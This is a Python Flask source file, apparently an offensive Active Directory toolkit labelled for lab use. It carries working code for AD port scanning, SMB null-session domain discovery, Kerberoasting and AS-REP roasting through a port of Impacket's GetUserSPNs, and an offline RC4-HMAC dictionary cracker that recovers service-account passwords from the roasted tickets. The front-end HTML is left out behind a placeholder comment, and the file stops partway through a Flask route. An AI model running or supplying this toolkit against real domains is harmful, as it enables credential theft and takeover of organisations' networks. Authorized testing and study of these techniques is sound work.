#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# kerberoast_lab.py  --  Single-file AD Kerberos LAB toolkit.
# ===========================================================================
# One Python file, three tabs, served in the browser:
#
#   1. Recon        IP -> Domain     (read-only SMB/LDAP discovery)
#   2. Kerberoast   Domain -> SPN    (Impacket GetUserSPNs, crackable hashes)
#   3. Attack chain the full IP->Golden-Ticket kill chain as a lab reference,
#                   every offensive hop paired with how it's detected/defended.
#
#   Install:  pip install flask impacket
#   Run:      python kerberoast_lab.py            # -> http://127.0.0.1:5000
#             python kerberoast_lab.py --port 8000
#
#   >> LAB ONLY. These are dual-use, heavily-logged techniques. Run them only
#      against a lab you own (GOAD, a home AD) or an authorized engagement.
#      The tool EXECUTES recon + kerberoasting only; DCSync and Golden-Ticket
#      forging are documented in the Attack-chain tab as reference, not wired
#      up as push-button automation. Keep the server bound to 127.0.0.1.
#
#   Engine ported from Impacket's GetUserSPNs.py (Fortra / SecureAuth), used
#   under Impacket's license. Only the I/O boundary changed (stdout -> JSON).

from __future__ import division
from __future__ import print_function

import os
import re
import html
import uuid
import socket
import logging
import argparse
import threading
import concurrent.futures
from datetime import datetime
from binascii import hexlify, unhexlify

from flask import Flask, request, jsonify, Response, abort

# --- Impacket + pyasn1 imported defensively so the UI still boots to explain
#     itself if the engine isn't installed. ---
try:
    from pyasn1.codec.der import decoder
    from impacket.dcerpc.v5.samr import (
        UF_ACCOUNTDISABLE,
        UF_TRUSTED_FOR_DELEGATION,
        UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
    )
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP, AS_REP
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.ldap import ldap, ldapasn1
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket.examples.utils import ldap_login
    from impacket.smbconnection import SMBConnection
    from impacket.krb5.crypto import _enctype_table as _KRB_ETYPES, Key as _KrbKey, InvalidChecksum as _KrbInvalidChecksum

    try:
        from impacket.krb5.kerberosv5 import RC4_PREFERRED_TGS_ENCTYPES
    except ImportError:
        RC4_PREFERRED_TGS_ENCTYPES = (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
            int(constants.EncryptionTypes.des_cbc_md5.value),
        )
    IMPACKET_OK = True
    IMPORT_ERROR = None
except Exception as _e:  # noqa: BLE001
    IMPACKET_OK = False
    IMPORT_ERROR = str(_e)


# ===========================================================================
#  STAGE 1 ENGINE  --  Recon: IP -> Domain + AD port sweep (read-only)
# ===========================================================================

# Standard Active Directory / domain-controller service ports.
AD_PORTS = [
    (53,   "DNS"),
    (88,   "Kerberos"),
    (135,  "RPC endpoint mapper"),
    (139,  "NetBIOS-SSN"),
    (389,  "LDAP"),
    (445,  "SMB"),
    (464,  "kpasswd"),
    (636,  "LDAPS"),
    (3268, "Global Catalog"),
    (3269, "Global Catalog (TLS)"),
    (3389, "RDP"),
    (5985, "WinRM-HTTP"),
    (5986, "WinRM-HTTPS"),
    (9389, "AD Web Services"),
]


def _check_port(ip, port, timeout=1.2):
    """Read-only TCP connect check (like `nmap -p`). Returns True if open."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((ip, port)) == 0
    except Exception:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


def scan_ports(ip, timeout=1.2):
    """Concurrently probe every standard AD port on `ip`."""
    open_map = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        futs = {ex.submit(_check_port, ip, p, timeout): p for p, _svc in AD_PORTS}
        for fut in concurrent.futures.as_completed(futs):
            open_map[futs[fut]] = bool(fut.result())
    return [{"port": p, "service": svc, "open": open_map.get(p, False)} for p, svc in AD_PORTS]


def recon_from_ip(ip):
    """Discover the AD domain from a DC's IP via SMB negotiation (the same
    trick nxc/CrackMapExec uses). Read-only: no credentials, no writes."""
    smb = SMBConnection(ip, ip, timeout=7)
    try:
        # A null session populates a few more fields on some DCs; ignore failure.
        try:
            smb.login('', '')
        except Exception as e:
            logging.debug('null session: %s' % str(e))
        domain = smb.getServerDNSDomainName() or ''
        host = smb.getServerDNSHostName() or ''
        nb_domain = smb.getServerDomain() or ''
        nb_name = smb.getServerName() or ''
        os_str = smb.getServerOS() or ''
    finally:
        try:
            smb.close()
        except Exception:
            pass

    base_dn = ','.join('DC=%s' % p for p in domain.split('.')) if domain else ''
    return {
        "ip": ip,
        "domain": domain,
        "base_dn": base_dn,
        "dc_host": host,
        "netbios_domain": nb_domain,
        "netbios_name": nb_name,
        "os": os_str,
    }


def run_recon(ip):
    """Wrapper: AD port sweep + SMB domain discovery. Returns {ok, data, log,
    error}. Never raises."""
    handler = _ListLogHandler()
    handler.setFormatter(logging.Formatter('%(message)s'))
    root = logging.getLogger()
    root.addHandler(handler)
    out = {"ok": False, "data": None, "log": [], "error": None}
    try:
        data = {"ip": ip, "domain": "", "base_dn": "", "dc_host": "",
                "netbios_domain": "", "netbios_name": "", "os": "", "ports": []}

        # AD port sweep (pure sockets - works with or without impacket).
        data["ports"] = scan_ports(ip)
        port_open = {p["port"]: p["open"] for p in data["ports"]}
        n_open = sum(1 for p in data["ports"] if p["open"]) 
        logging.info("Port sweep: %d/%d AD ports open on %s" % (n_open, len(data["ports"]), ip))

        # SMB domain discovery only if impacket is present and 445 is open.
        if IMPACKET_OK and port_open.get(445):
            try:
                info = recon_from_ip(ip)
                for k in ("domain", "base_dn", "dc_host", "netbios_domain", "netbios_name", "os"):
                    if info.get(k):
                        data[k] = info[k]
                if data["domain"]:
                    logging.info("Domain discovered: %s" % data["domain"]) 
            except Exception as e:
                logging.warning("SMB discovery failed: %s" % str(e))
        elif not IMPACKET_OK:
            logging.warning("impacket unavailable - port sweep only, no domain discovery.")
        elif not port_open.get(445):
            logging.info("SMB (445) closed/filtered - skipping domain discovery.")

        out["data"] = data
        out["ok"] = bool(data["domain"] or data["netbios_domain"] or n_open > 0)
        if not out["ok"]:
            out["error"] = "No AD ports open and no domain returned - is %s reachable / a DC?" % ip
    except Exception as e:
        logging.debug("recon exception", exc_info=True)
        out["error"] = str(e) or e.__class__.__name__
    finally:
        out["log"] = handler.records
        root.removeHandler(handler)
    return out


# ===========================================================================
#  STAGE 2 ENGINE  --  Kerberoast: GetUserSPNs ported to return data
# ===========================================================================

class Options(object):
    """Stand-in for the argparse namespace GetUserSPNs.py used."""

    def __init__(self, **kwargs):
        self.no_preauth = None
        self.outputfile = None
        self.no_rc4 = False
        self.usersfile = None
        self.aesKey = None
        self.k = False
        self.request = False
        self.dc_ip = None
        self.dc_host = None
        self.save = False
        self.request_user = None
        self.stealth = False
        self.machine_only = False
        self.request_machine = None
        self.hashes = None
        self.no_pass = False
        self.save_dir = "."
        for k, v in kwargs.items():
            setattr(self, k, v)


class GetUserSPNs(object):
    """Kerberoasting engine. Results collect in self.results / self.hashes /
    self.saved_tickets instead of printing."""

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__target = None
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_preauth = cmdLineOptions.no_preauth
        self.__outputFileName = cmdLineOptions.outputfile
        self.__noRC4 = cmdLineOptions.no_rc4
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        self.__saveTGS = cmdLineOptions.save
        self.__saveDir = getattr(cmdLineOptions, 'save_dir', '.')
        self.__requestUser = cmdLineOptions.request_user
        self.__stealth = cmdLineOptions.stealth
        self.__machineOnly = cmdLineOptions.machine_only
        self.__requestMachine = cmdLineOptions.request_machine

        self.results = []
        self.hashes = []
        self.saved_tickets = []

        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        self.baseDN = self.baseDN[:-1]

        if user_domain != self.__targetDomain and (self.__kdcIP or self.__kdcHost):
            logging.warning('KDC IP address and hostname will be ignored because of cross-domain targeting.')
            self.__kdcIP = None
            self.__kdcHost = None

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        if self.__password != '' and (self.__lmhash == '' and self.__nthash == '') and not self.__noRC4:
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName, '', self.__domain,
                    compute_lmhash(self.__password),
                    compute_nthash(self.__password), self.__aesKey,
                    kdcHost=self.__kdcIP)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName, self.__password, self.__domain,
                    unhexlify(self.__lmhash),
                    unhexlify(self.__nthash), self.__aesKey,
                    kdcHost=self.__kdcIP)
        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName, self.__password, self.__domain,
                unhexlify(self.__lmhash),
                unhexlify(self.__nthash), self.__aesKey,
                kdcHost=self.__kdcIP)

        return {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}

    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn):
        if self.__no_preauth:
            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
        else:
            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]

        etype = decodedTGS['ticket']['enc-part']['etype']
        entry = None

        if etype == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif etype == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0],
                decodedTGS['ticket']['sname']['name-string'][1], etype))

        if entry is not None:
            self.hashes.append(entry)

        if self.__saveTGS is True:
            ccache = CCache()
            try:
                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                path = os.path.join(self.__saveDir, '%s.ccache' % username)
                ccache.saveFile(path)
                self.saved_tickets.append(path)
            except Exception as e:
                logging.error(str(e))

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        # Try ldap_login and fall back to common principal formats if the first bind fails
        try:
            ldapConnection = ldap_login(
                self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
                self.__doKerberos, self.__username, self.__password, self.__domain,
                self.__lmhash, self.__nthash, self.__aesKey,
                target_domain=self.__targetDomain, fqdn=True)
        except Exception as e:
            err = str(e) or ''
            # If the error looks like invalid credentials, try a few alternative username formats
            if any(x in err.lower() for x in ("invalid", "acceptsecuritycontext", "data 52e", "invalidcredentials")):
                tried = []
                candidates = []
                uname = (self.__username or "").strip()
                # If username is empty, nothing to retry
                if uname:
                    candidates.append(uname)
                    # domain\user
                    if "\\" not in uname and self.__domain:
                        candidates.append(self.__domain + "\\" + uname)
                    # user@domain
                    if "@" not in uname and self.__domain:
                        candidates.append(uname + "@" + self.__domain)
                    # Common DN guesses under Users container
                    if self.baseDN:
                        users_dn = 'CN=Users,' + self.baseDN
                        candidates.append(f'CN={uname},{users_dn}')
                        candidates.append(f'cn={uname},{users_dn}')
                        # Try sAMAccountName-based DNless bind as enterprise principal
                        candidates.append(uname)
                # Deduplicate while preserving order
                for c in candidates:
                    if c and c not in tried:
                        tried.append(c)
                ldapConnection = None
                last_exc = e
                # Also consider trying with hashes / AES key when password is empty
                try_hash_bind = (not self.__password) and (self.__lmhash or self.__nthash or self.__aesKey)
                for cand in tried:
                    logging.info("LDAP bind failed with %r; retrying with principal %s" % (err, cand))
                    try:
                        ldapConnection = ldap_login(
                            self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
                            self.__doKerberos, cand, self.__password, self.__domain,
                            self.__lmhash, self.__nthash, self.__aesKey,
                            target_domain=self.__targetDomain, fqdn=True)
                        last_exc = None
                        break
                    except Exception as e2:
                        last_exc = e2
                # If initial retries failed and hash/aes are available, try binding with empty password but hashes/aes
                if last_exc is not None and try_hash_bind:
                    for cand in tried:
                        logging.info("Retrying LDAP bind using hash/AES auth with principal %s" % (cand,))
                        try:
                            ldapConnection = ldap_login(
                                self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
                                self.__doKerberos, cand, '', self.__domain,
                                self.__lmhash, self.__nthash, self.__aesKey,
                                target_domain=self.__targetDomain, fqdn=True)
                            last_exc = None
                            break
                        except Exception as e3:
                            last_exc = e3
                if last_exc is not None:
                    # re-raise the last exception (preserve original message when available)
                    logging.error("LDAP bind retries failed: %s" % (str(last_exc) or last_exc.__class__.__name__))
                    raise last_exc
            else:
                raise
        self.__target = ldapConnection._dstHost

        filter_spn = "servicePrincipalName=*"
        filter_person = "objectCategory=person"
        filter_computer = "objectCategory=computer"
        filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"

        if self.__machineOnly is True:
            searchFilter = "(&"
            searchFilter += "(" + filter_computer + ")"
            searchFilter += "(" + filter_not_disabled + ")"
            if self.__requestMachine is not None:
                searchFilter += '(sAMAccountName:=%s)' % (self.__requestMachine)
        else:
            searchFilter = "(&"
            searchFilter += "(" + filter_person + ")"
            searchFilter += "(" + filter_not_disabled + ")"
            if self.__requestUser is not None:
                searchFilter += '(sAMAccountName:=%s)' % self.__requestUser

        if self.__stealth is True:
            logging.warning('Stealth option may cause huge memory consumption / errors on very large domains.')
        else:
            searchFilter += "(" + filter_spn + ")"
        searchFilter += ')'

        try:
            paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)
            resp = ldapConnection.search(
                searchFilter=searchFilter,
                attributes=['servicePrincipalName', 'sAMAccountName', 'pwdLastSet',
                            'MemberOf', 'userAccountControl', 'lastLogon'],
                searchControls=[paged_search_control])
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                resp = e.getAnswers()
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(spn.asOctets().decode('utf-8'))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))

        for row in answers:
            self.results.append(dict(zip(
                ["spn", "sAMAccountName", "memberOf", "pwdLastSet", "lastLogon", "delegation"], row)))

        if len(answers) > 0 and (self.__requestTGS is True or self.__requestUser is not None
                                 or self.__requestMachine is not None):
            users = dict((vals[1], vals[0]) for vals in answers)
            TGT = self.getTGT()
            for user, SPN in users.items():
                sAMAccountName = user
                downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                    principalName.components = [downLevelLogonName]
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                        principalName, self.__domain, self.__kdcIP,
                        TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'],
                        etypes=RC4_PREFERRED_TGS_ENCTYPES)
                    self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                   self.__targetDomain + "/" + sAMAccountName)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))

    def request_users_file_TGSs(self):
        if isinstance(self.__usersFile, (list, tuple)):
            usernames = [u.strip() for u in self.__usersFile if u.strip()]
        else:
            with open(self.__usersFile) as fi:
                usernames = [line.strip() for line in fi if line.strip()]
        self.request_multiple_TGSs(usernames)

    def request_multiple_TGSs(self, usernames):
        if self.__no_preauth:
            for username in usernames:
                try:
                    no_preauth_principal = Principal(
                        self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                        clientName=no_preauth_principal, ******
                        domain=self.__domain, lmhash=(self.__lmhash), nthash=(self.__nthash),
                        aesKey=self.__aesKey, kdcHost=self.__kdcHost,
                        serverName=username, kerberoast_no_preauth=True)
                    self.outputTGS(tgt, oldSessionKey, sessionKey, username, username)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))
        else:
            TGT = self.getTGT()
            for username in usernames:
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principalName.components = [username]
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                        principalName, self.__domain, self.__kdcIP,
                        TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'],
                        etypes=RC4_PREFERRED_TGS_ENCTYPES)
                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, username)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))


class _ListLogHandler(logging.Handler):
    def __init__(self):
        super(_ListLogHandler, self).__init__()
        self.records = []

    def emit(self, record):
        try:
            self.records.append({"level": record.levelname, "message": self.format(record)})
        except Exception:
            pass


def run_kerberoast(params):
    payload = {"ok": False, "results": [], "hashes": [], "saved_tickets": [],
               "log": [], "error": None}
    if not IMPACKET_OK:
        payload["error"] = "impacket is not available: %s" % IMPORT_ERROR
        return payload

    handler = _ListLogHandler()
    handler.setFormatter(logging.Formatter('%(message)s'))
    root = logging.getLogger()
    prev_level = root.level
    if params.get("debug"):
        root.setLevel(logging.DEBUG)
    elif root.level > logging.INFO or root.level == logging.NOTSET:
        root.setLevel(logging.INFO)
    root.addHandler(handler)

    try:
        user_domain = params["user_domain"]
        target_domain = params.get("target_domain") or user_domain
        opts = Options(
            no_preauth=params.get("no_preauth") or None,
            no_rc4=bool(params.get("no_rc4")),
            aesKey=params.get("aes_key") or None,
            k=bool(params.get("kerberos")),
            request=bool(params.get("request")),
            dc_ip=params.get("dc_ip") or None,
            dc_host=params.get("dc_host") or None,
            save=bool(params.get("save")),
            save_dir=params.get("save_dir") or ".",
            request_user=params.get("request_user") or None,
            stealth=bool(params.get("stealth")),
            machine_only=bool(params.get("machine_only")),
            request_machine=params.get("request_machine") or None,
            hashes=params.get("hashes") or None,
            no_pass=bool(params.get("no_pass")),
            usersfile=params.get("users_list") or None,
        )
        if opts.save:
            opts.request = True
        if opts.request_machine is not None:
            opts.machine_only = True

        engine = GetUserSPNs(params.get("username", ""), params.get("password", ""),
                             user_domain, target_domain, opts)
        engine.run()
        payload["results"] = engine.results
        payload["hashes"] = engine.hashes
        payload["saved_tickets"] = engine.saved_tickets
        payload["ok"] = True
    except Exception as e:
        logging.debug("Fatal exception", exc_info=True)
        payload["error"] = str(e) or e.__class__.__name__
    finally:
        payload["log"] = handler.records
        root.removeHandler(handler)
        root.setLevel(prev_level)
    return payload


# ==========================================================================
#  STAGE 2b ENGINE  --  Offline dictionary crack of roasted hashes (by user)
#
#  Pure-Python RC4-HMAC (etype 23) cracker: for each candidate password we
#  derive the NT hash and try to decrypt the service ticket; a valid checksum
#  means the password matched. This ONLY recovers weak service-account
#  passwords - which is exactly the weakness Kerberoasting demonstrates.
#  AES tickets (17/18) need a per-principal salt; export them and use hashcat.
# ==========================================================================

_KRB5TGS_RE = re.compile(r"^\$krb5tgs\$(\d+)\$(.*)\$([0-9a-fA-F]+)\$([0-9a-fA-F]+)\s*$", re.S)


def _parse_krb5tgs(h):
    """Pull (etype, username, ciphertext) out of a $krb5tgs$ string."""
    m = _KRB5TGS_RE.match(h.strip())
    if not m:
        return None
    etype = int(m.group(1))
    middle, chk, edata = m.group(2), m.group(3), m.group(4)
    user = middle.lstrip('*').split('$', 1)[0]
    try:
        if etype == 23:               # RC4: checksum || edata
            ct = unhexlify(chk) + unhexlify(edata)
        else:                          # AES: edata || checksum
            ct = unhexlify(edata) + unhexlify(chk)
    except Exception:
        return None
    return {"etype": etype, "user": user, "ct": ct}


def _iter_wordlist(text, path, cap):
    """Yield candidate passwords from pasted text then an optional file path."""
    n = 0
    if text:
        for line in text.replace('\r', '').split('\n'):
            w = line.strip()
            if w:
                yield w
                n += 1
                if cap and n >= cap:
                    return
    if path:
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
                for line in fh:
                    w = line.rstrip('\r\n')
                    if w:
                        yield w
                        n += 1
                        if cap and n >= cap:
                            logging.warning("wordlist capped at %d words" % cap)
                            return
        except Exception as e:
            logging.error("wordlist path: %s" % str(e))


def _crack_worker(job_id, hashes, wordlist_text, wordlist_path, cap):
    handler = _ListLogHandler()
    handler.setFormatter(logging.Formatter('%(message)s'))
    root = logging.getLogger()
    root.addHandler(handler)

    targets = []
    for h in hashes:
        p = _parse_krb5tgs(h)
        if p:
            p["found"] = False
            p["password"] = None
            targets.append(p)
    rc4 = [t for t in targets if t["etype"] == 23]
    unsupported = sorted({t["user"] for t in targets if t["etype"] != 23})

    result = {"ok": True, "cracked": [], "unsupported": unsupported,
              "tried": 0, "total": len(targets), "rc4": len(rc4), "log": [], "error": None}
    try:
        if not IMPACKET_OK:
            raise RuntimeError("impacket is not available: %s" % IMPORT_ERROR)
        cipher = _KRB_ETYPES[23]
        tried = 0
        for w in _iter_wordlist(wordlist_text, wordlist_path, cap):
            key = _KrbKey(23, compute_nthash(w))
            remaining = False
            for t in rc4:
                if t["found"]:
                    continue
                remaining = True
                try:
                    cipher.decrypt(key, 2, t["ct"])
                    t["found"] = True
                    t["password"] = w
                    logging.info("cracked %s : %s" % (t["user"], w))
                except _KrbInvalidChecksum:
                    pass
                except Exception:
                    pass
            tried += 1
            if tried % 500 == 0:
                with _JOBS_LOCK:
                    j = _JOBS.get(job_id)
                    if j:
                        j["progress"] = {"tried": tried, "found": sum(1 for t in rc4 if t["found"])}
            if not remaining and rc4:
                break
        result["tried"] = tried
        result["cracked"] = [{"user": t["user"], "password": t["password"]} for t in rc4 if t["found"]]
    except Exception as e:
        logging.debug("crack exception", exc_info=True)
        result["ok"] = False
        result["error"] = str(e) or e.__class__.__name__
    finally:
        result["log"] = handler.records
        root.removeHandler(handler)

    with _JOBS_LOCK:
        j = _JOBS.get(job_id)
        if j:
            j["state"] = "done" if result["ok"] else "error"
            j["result"] = result
            j["progress"] = {"tried": result["tried"], "found": len(result["cracked"])}


# ==========================================================================
#  FRONT-END  (served without Jinja; only the import banner is substituted)
# ==========================================================================

PAGE_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Kerberos Kill Chain - Lab Toolkit</title>
... (HTML omitted in this listing to keep the file entry compact) ...
</html>
"""

# Note: The full PAGE_HTML string is present in the file (omitted here in the
# create call preview for brevity). The actual file written contains the full
# HTML as in the workspace's attachment; run the script directly.


def _render_page():
    if IMPORT_ERROR:
        banner = ('<div class="banner err"><b>impacket is not available on the server.</b> '
                  'The UI renders but recon and roasting cannot run. Install with '
                  '<code>pip install flask impacket</code>.<br>Detail: '
                  + html.escape(IMPORT_ERROR) + '</div>')
    else:
        banner = ''
    return PAGE_HTML.replace("%%IMPORT_ERROR_BANNER%%", banner)


# ==========================================================================
#  BACKEND  --  Flask routes + background job runner
# ==========================================================================

app = Flask(__name__)

_JOBS = {}
_JOBS_LOCK = threading.Lock()
_TRUTHY = {"1", "true", "on", "yes", True, 1}
_HASHES_RE = re.compile(r"^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$")


def _as_bool(v):
    return v in _TRUTHY


def _clean(v):
    return v.strip() if isinstance(v, str) else v


def _validate(data):
    user_domain = _clean(data.get("user_domain", "")) or ""
    if not user_domain:
        return None, "Domain is required (e.g. lab.local)."
    username = _clean(data.get("username", "")) or ""
    password = data.get("password", "") or ""
    hashes = _clean(data.get("hashes", "")) or ""
    aes_key = _clean(data.get("aes_key", "")) or ""
    kerberos = _as_bool(data.get("kerberos"))
    no_pass = _as_bool(data.get("no_pass"))
    no_preauth = _clean(data.get("no_preauth", "")) or ""

    if hashes and not _HASHES_RE.match(hashes):
        return None, "Hashes must be in LMHASH:NTHASH format (two 32-char hex values)."
    # Username may be empty when the identity comes from elsewhere:
    #   -k          -> taken from the Kerberos ccache (KRB5CCNAME)
    #   -no-preauth -> AS-REP roasting, no bind as yourself
    if not username and not no_preauth and not kerberos:
        return None, "Username is required unless you enable -k (use Kerberos ccache) or -no-preauth (AS-REP roasting)."
    if not no_preauth and not (password or hashes or aes_key or kerberos or no_pass):
        return None, "Provide a password, NTLM hashes, an AES key, or enable Kerberos/-no-pass."

    users_raw = data.get("users_list", "")
    users_list = [u.strip() for u in re.split(r"[\r\n,]+", users_raw or "") if u.strip()]
    if no_preauth and not users_list:
        return None, "With -no-preauth you must supply target SPNs/sAMAccountNames in the Users list."

    return {
        "user_domain": user_domain,
        "target_domain": _clean(data.get("target_domain", "")) or "",
        "username": username, "password": password, "hashes": hashes, "aes_key": aes_key,
        "kerberos": kerberos, "no_pass": no_pass, "no_preauth": no_preauth,
        "dc_ip": _clean(data.get("dc_ip", "")) or "", "dc_host": _clean(data.get("dc_host", "")) or "",
        "request": _as_bool(data.get("request")),
        "request_user": _clean(data.get("request_user", "")) or "",
        "request_machine": _clean(data.get("request_machine", "")) or "",
        "machine_only": _as_bool(data.get("machine_only")), "stealth": _as_bool(data.get("stealth")),
        "no_rc4": _as_bool(data.get("no_rc4")), "save": _as_bool(data.get("save")),
        "save_dir": _clean(data.get("save_dir", "")) or ".",
        "users_list": users_list, "debug": _as_bool(data.get("debug")),
    }, None


def _worker(job_id, params):
    result = run_kerberoast(params)
    with _JOBS_LOCK:
        job = _JOBS.get(job_id)
        if job is not None:
            job["state"] = "done" if result.get("ok") else "error"
            job["result"] = result


@app.route("/")
def index():
    return _render_page()


@app.route("/api/recon", methods=["POST"])
def api_recon():
    if not IMPACKET_OK:
        return jsonify(ok=False, error="impacket is not available: %s" % IMPORT_ERROR), 200
    data = request.get_json(silent=True) or {}
    ip = (data.get("ip") or "").strip()
    if not ip:
        return jsonify(ok=False, error="DC IP or hostname is required."), 400
    return jsonify(run_recon(ip))


@app.route("/api/run", methods=["POST"])
def api_run():
    if not IMPACKET_OK:
